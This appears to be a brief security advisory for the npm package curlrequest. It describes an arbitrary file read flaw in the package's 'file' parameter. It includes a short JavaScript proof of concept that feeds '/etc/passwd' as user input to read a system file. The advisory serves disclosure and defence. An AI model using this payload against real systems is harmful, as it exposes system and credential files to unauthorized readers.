# Overview

[curlrequest](https://www.npmjs.com/package/curlrequest) is a curlrequest is a node wrapper for the command line curl(1).

Affected versions of this package are vulnerable to Arbitrary File Read. It is possible to read any file by populating the file parameter with user input.


# Proof of Concept

```
var curl = require("curlrequest");

let userPayload = "/etc/passwd";
curl.request({ file: userPayload }, function (err, stdout, meta) {
    console.log("%s %s", meta.cmd, meta.args.join(" "));
});
```
